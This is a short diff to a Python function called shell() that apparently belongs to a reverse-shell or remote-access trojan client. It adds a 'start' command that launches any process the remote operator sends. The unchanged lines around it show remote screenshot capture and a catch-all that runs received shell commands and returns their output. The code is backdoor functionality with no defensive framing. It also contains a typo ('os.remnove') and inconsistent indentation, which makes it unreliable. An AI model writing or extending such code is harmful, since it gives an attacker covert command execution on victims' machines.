@@ -62,6 +62,12 @@ def shell():
 				os.remnove("monitor-1.png")
 			except:
 				my_send("[!!] Failed to take screenshot")
+		elif command[:5] == "start":
+			try: 
+				subprocess.Popen(command[6:], shell=True)
+				my_send("[+] Started!")
+			except:
+				my_send("[!!] Failed to start") 
                 else:
                        proc=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        result = proc.stdout.read() + proc.stderr.read()
